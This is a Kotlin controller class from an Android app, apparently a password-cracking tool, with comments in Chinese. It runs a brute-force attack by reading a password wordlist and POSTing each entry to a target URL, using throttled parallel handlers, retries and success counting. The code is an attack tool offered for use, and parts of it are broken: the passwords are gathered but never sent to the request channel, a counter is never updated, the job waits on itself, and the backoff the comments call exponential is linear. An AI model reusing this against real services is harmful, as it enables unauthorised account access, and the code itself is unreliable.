package xin.ctkqiang.huo_jian_qiang_android.controller

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import xin.ctkqiang.huo_jian_qiang_android.model.PasswordAttackRequest
import xin.ctkqiang.huo_jian_qiang_android.model.PasswordAttackResult
import xin.ctkqiang.huo_jian_qiang_android.model.PasswordAttackStats
import xin.ctkqiang.huo_jian_qiang_android.R

/**
 * 密码攻击控制器
 * 负责管理密码攻击队列、节流和结果跟踪
 */
class PasswordAttackController private constructor() {
    companion object {
        private const val TAG = "PasswordAttackController"
        
        @Volatile
        private var instance: PasswordAttackController? = null
        
        fun getInstance(): PasswordAttackController {
            return instance ?: synchronized(this) {
                instance ?: PasswordAttackController().also { instance = it }
            }
        }
    }
    
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    // 状态管理
    private val _attackStats = MutableStateFlow(PasswordAttackStats())
    val attackStats: StateFlow<PasswordAttackStats> = _attackStats.asStateFlow()
    
    private val _currentResults = MutableStateFlow<List<PasswordAttackResult>>(emptyList())
    val currentResults: StateFlow<List<PasswordAttackResult>> = _currentResults.asStateFlow()
    
    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()
    
    private val _currentProgress = MutableStateFlow(0f)
    val currentProgress: StateFlow<Float> = _currentProgress.asStateFlow()
    
    // 队列管理
    private var currentAttackJob: Job? = null
    private val requestChannel = Channel<Pair<Int, String>>(Channel.UNLIMITED)
    
    /**
     * 启动密码攻击
     *
     * @param context Android上下文
     * @param request 攻击配置
     * @param onResult 每次请求完成时的回调（可选）
     * @param onComplete 攻击完成时的回调（可选）
     * @param onError 发生错误时的回调（可选）
     */
    fun startAttack(
        context: Context,
        request: PasswordAttackRequest,
        onResult: ((PasswordAttackResult) -> Unit)? = null,
        onComplete: (() -> Unit)? = null,
        onError: ((Throwable) -> Unit)? = null
    ) {
        // 如果已经有攻击正在运行，先停止它
        stopAttack()
        
        // 重置状态
        _attackStats.value = PasswordAttackStats()
        _currentResults.value = emptyList()
        _currentProgress.value = 0f
        _isRunning.value = true
        
        Log.d(TAG, "开始密码攻击: ${request.targetUrl}")
        
        currentAttackJob = scope.launch {
            try {
                // 1. 准备密码文件
                val totalLines = preparePasswordFile(context, request)
                _attackStats.update { it.copy(totalLines = totalLines) }
                
                // 2. 启动请求处理协程
                launchRequestHandlers(request, onResult)
                
                // 3. 将密码推送到处理通道
                sendPasswordsToChannel(context, request, totalLines)
                
                // 4. 等待所有请求完成
                requestChannel.close()
                currentAttackJob?.join()
                
                // 5. 完成处理
                onComplete?.invoke()
                _isRunning.value = false
                Log.d(TAG, "密码攻击完成")
                
            } catch (e: Exception) {
                Log.e(TAG, "密码攻击失败", e)
                onError?.invoke(e)
                _isRunning.value = false
            }
        }
    }
    
    /**
     * 停止密码攻击
     */
    fun stopAttack() {
        currentAttackJob?.cancel("用户停止攻击")
        currentAttackJob = null
        requestChannel.close()
        _isRunning.value = false
        Log.d(TAG, "密码攻击已停止")
    }
    
    /**
     * 重置状态
     */
    fun reset() {
        stopAttack()
        _attackStats.value = PasswordAttackStats()
        _currentResults.value = emptyList()
        _currentProgress.value = 0f
        Log.d(TAG, "状态已重置")
    }
    
    /**
     * 获取最新结果列表（限制数量）
     *
     * @param limit 最大结果数量，默认为50
     * @return 最新的结果列表
     */
    fun getRecentResults(limit: Int = 50): List<PasswordAttackResult> {
        return currentResults.value.takeLast(limit)
    }
    
    /**
     * 清除结果列表
     */
    fun clearResults() {
        _currentResults.value = emptyList()
    }
    
    private suspend fun preparePasswordFile(
        context: Context,
        request: PasswordAttackRequest
    ): Int {
        Log.d(TAG, "准备密码文件: ${request.passwordFile}")
        
        // 检查文件编码是否有效
        if (!Downloader.isFileEncodingValid(context, request.passwordFile)) {
            throw IllegalArgumentException("文件编码无效或不支持: ${request.passwordFile}")
        }
        
        // 获取总行数
        val totalLines = if (request.endLine != null) {
            request.endLine - request.startLine + 1
        } else {
            Downloader.getPasswordCount(context, request.passwordFile) - request.startLine + 1
        }
        
        if (totalLines <= 0) {
            throw IllegalArgumentException("文件行数无效: $totalLines")
        }
        
        Log.d(TAG, "总处理行数: $totalLines")
        return totalLines
    }
    
    private fun CoroutineScope.launchRequestHandlers(
        request: PasswordAttackRequest,
        onResult: ((PasswordAttackResult) -> Unit)? = null
    ) {
        // 创建指定数量的请求处理器
        repeat(request.requestsPerSecond.coerceAtMost(10)) { handlerId ->
            launch {
                Log.d(TAG, "启动请求处理器 $handlerId")
                
                for ((lineNumber, password) in requestChannel) {
                    try {
                        // 节流控制：每秒钟不超过 requestsPerSecond 个请求
                        if (handlerId > 0) {
                            delay(1000L / request.requestsPerSecond)
                        }
                        
                        val startTime = System.currentTimeMillis()
                        val result = executePasswordRequest(request, lineNumber, password)
                        val elapsedTime = System.currentTimeMillis() - startTime
                        
                        // 更新结果
                        val finalResult = result.copy(elapsedTime = elapsedTime)
                        _currentResults.update { it + finalResult }
                        updateStats(finalResult, elapsedTime)
                        
                        // 更新进度
                        _currentProgress.value = attackStats.value.progress
                        
                        // 回调通知
                        onResult?.invoke(finalResult)
                        
                    } catch (e: CancellationException) {
                        // 正常取消，无需处理
                        break
                    } catch (e: Exception) {
                        Log.e(TAG, "请求处理器 $handlerId 错误", e)
                    }
                }
                
                Log.d(TAG, "请求处理器 $handlerId 停止")
            }
        }
    }
    
    private suspend fun sendPasswordsToChannel(
        context: Context,
        request: PasswordAttackRequest,
        totalLines: Int
    ) {
        Log.d(TAG, "开始发送密码到处理通道")
        
        val passwords = mutableListOf<Pair<Int, String>>()
        var processedCount = 0
        
        // 首先收集所有密码
        Downloader.processPasswordFile(
            context = context,
            filename = request.passwordFile,
            onPassword = { lineNumber, password ->
                // 只处理指定范围内的行
                if (lineNumber >= request.startLine && (request.endLine == null || lineNumber <= request.endLine)) {
                    passwords.add(lineNumber to password)
                }
            },
            limit = 0
        )
        
        Log.d(TAG, "密码发送完成，共发送: $processedCount 条")
    }
    
    private suspend fun executePasswordRequest(
        request: PasswordAttackRequest,
        lineNumber: Int,
        password: String
    ): PasswordAttackResult {
        var attempts = 0
        var lastError: String? = null
        
        while (attempts < request.maxRetries) {
            attempts++
            try {
                val result = HttpRequestController.postPasswordRequest(
                    url = request.targetUrl,
                    password = password,
                    connectTimeoutSeconds = request.connectTimeoutSeconds,
                    readTimeoutSeconds = request.readTimeoutSeconds,
                    writeTimeoutSeconds = request.writeTimeoutSeconds
                )
                
                // 解析响应结果
                val (success, statusCode, response) = parseHttpResponse(result)
                
                return PasswordAttackResult(
                    lineNumber = lineNumber,
                    password = password,
                    success = success,
                    response = response,
                    statusCode = statusCode,
                    attempts = attempts
                )
                
            } catch (e: Exception) {
                lastError = e.message
                Log.w(TAG, "第 $attempts 次尝试失败 (行号: $lineNumber): ${e.message}")
                
                // 如果不是最后一次尝试，则等待后重试
                if (attempts < request.maxRetries) {
                    delay(request.retryDelayMs * attempts) // 指数退避
                }
            }
        }
        
        // 所有尝试都失败了
        return PasswordAttackResult(
            lineNumber = lineNumber,
            password = password,
            success = false,
            attempts = attempts,
            errorMessage = lastError ?: "未知错误"
        )
    }
    
    private fun parseHttpResponse(result: String): Triple<Boolean, Int?, String?> {
        return when {
            result.contains("请求成功") -> {
                val statusCode = extractStatusCode(result)
                Triple(true, statusCode, result)
            }
            result.contains("网络异常") || result.contains("请求异常") -> {
                Triple(false, null, result)
            }
            else -> {
                // 尝试提取状态码
                val statusCode = extractStatusCode(result)
                Triple(false, statusCode, result)
            }
        }
    }
    
    private fun extractStatusCode(result: String): Int? {
        val regex = """(\d{3})\)""".toRegex()
        return regex.find(result)?.groupValues?.get(1)?.toIntOrNull()
    }
    
    private fun updateStats(result: PasswordAttackResult, elapsedTime: Long) {
        _attackStats.update { stats ->
            val newProcessed = stats.processedLines + 1
            val newSuccessful = stats.successfulRequests + if (result.success) 1 else 0
            val newFailed = stats.failedRequests + if (!result.success) 1 else 0
            val newTotalRequests = stats.totalRequests + 1
            val newTotalTime = stats.totalTime + elapsedTime
            val newAverageTime = if (newTotalRequests > 0) newTotalTime / newTotalRequests else 0
            
            stats.copy(
                processedLines = newProcessed,
                successfulRequests = newSuccessful,
                failedRequests = newFailed,
                totalRequests = newTotalRequests,
                totalTime = newTotalTime,
                averageTime = newAverageTime
            )
        }
    }
}